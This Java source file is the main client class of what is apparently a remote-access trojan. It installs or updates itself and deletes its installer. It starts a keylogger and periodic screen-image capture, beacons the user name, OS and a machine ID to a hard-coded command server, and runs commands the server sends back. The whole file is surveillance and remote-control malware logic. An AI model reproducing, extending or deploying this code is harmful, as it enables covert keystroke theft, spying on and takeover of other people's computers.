package br.com.introcdc.connect.client;
/*
 * Written by IntroCDC, Bruno Coêlho at 13/01/2025 - 13:40
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.command.ClientCommandEnum;
import br.com.introcdc.connect.client.components.*;

import java.io.*;
import java.net.Socket;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

public class ConnectClient {

    public static void main(String[] args) {
        startClient(false);
    }

    public static final ScheduledExecutorService EXECUTOR =
            Executors.newScheduledThreadPool(5);

    public static Runnable runnable(Runnable runnable) {
        return () -> {
            try {
                runnable.run();
            } catch (Exception exception) {
                exception(exception);
            }
        };
    }

    // Message Variables
    public static PrintWriter WRITER;
    public static boolean DEBUG = false;
    public static final boolean LOCAL_DEBUG = false;

    /**
     * Start Client
     */
    public static void startClient(boolean update) {
        if (ClientFileComponents.getFileName().equalsIgnoreCase("Uninstall.jar")) {
            ClientInstallComponents.uninstall();
            return;
        }
        if (ClientFileComponents.getFileName().equalsIgnoreCase("Connect.jar") && update) {
            ClientInstallComponents.update();
            return;
        } else if (!ClientFileComponents.getFileName().equalsIgnoreCase(ClientInstallComponents.LOCAL_FILE) && ClientInstallComponents.install()) {
            return;
        }
        ClientFileComponents.deleteFile(new File("Connect.jar"));
        ClientCommandEnum.registerCommands();
        new Thread(ClientKeyLoggerComponents::startKeyLogger).start();
        new Thread(ClientControlComponents::startUpdater).start();
        EXECUTOR.schedule(runnable(() -> new Thread(ClientImageComponents::startHistory).start()), Connect.DELAY, Connect.DELAY_TYPE);
        for (; ; ) {
            try {
                connectToServer();
            } catch (Exception exception) {
                exception(exception);
            }
            try {
                Thread.sleep(10 * 1000);
                System.gc();
            } catch (Exception ignored) {
            }
        }
    }

    /**
     * Send Message to Server
     */
    public static void msg(String message) {
        if (LOCAL_DEBUG) {
            System.out.println("Enviando: " + message);
        }
        try {
            WRITER.println(message);
            WRITER.flush();
        } catch (Exception exception) {
            exception(exception);
        }
    }

    /**
     * Send Exception to Server
     */
    public static void exception(Exception exception) {
        if (!DEBUG) {
            return;
        }

        msg(exception.toString());
        for (StackTraceElement element : exception.getStackTrace()) {
            msg("\tat " + element.toString());
        }
        Throwable cause = exception.getCause();
        while (cause != null) {
            msg("Caused by: " + cause);
            for (StackTraceElement element : cause.getStackTrace()) {
                msg("\tat " + element.toString());
            }
            cause = cause.getCause();
        }
    }

    public static String KEY = ClientInstallComponents.generateUniqueCode();

    public static void connectToServer() throws Exception {
        Socket socket = new Socket(Connect.IP, Connect.PORT);
        new DataOutputStream(socket.getOutputStream()).writeUTF("MAIN");
        BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
        WRITER = writer;
        msg("connect:" + ConnectClient.KEY + "|" + System.getProperty("user.name") + "|" + ClientFileComponents.toDate(new File(ClientInstallComponents.LOCAL_FILE).lastModified()) + "|" + System.getProperty("os.name"));
        EXECUTOR.schedule(runnable(() -> {
            new Thread(ClientImageComponents::execHistoryUpdate).start();
            new Thread(ClientControlComponents::sendBasicInfo).start();
        }), Connect.DELAY, Connect.DELAY_TYPE);

        ScheduledFuture<?> keepAliveTask = EXECUTOR.scheduleAtFixedRate(runnable(() -> {
            try {
                writer.println("");
                writer.flush();
            } catch (Exception ignored) {
            }
        }), 15, 15, TimeUnit.SECONDS);

        try {
            String serverMessage;
            while ((serverMessage = reader.readLine()) != null) {
                if (LOCAL_DEBUG) {
                    System.out.println("Recebido: " + serverMessage);
                }
                ClientCommand.handleCommand(serverMessage);
            }
        } catch (Exception exception) {
            msg("Ocorreu um erro no processamento da mensagem do servidor (" + exception.getMessage() + ")");
            exception(exception);
        } finally {
            if (keepAliveTask != null) {
                keepAliveTask.cancel(true);
            }
            try {
                socket.close();
            } catch (Exception ignored) {
            }
        }
    }

}
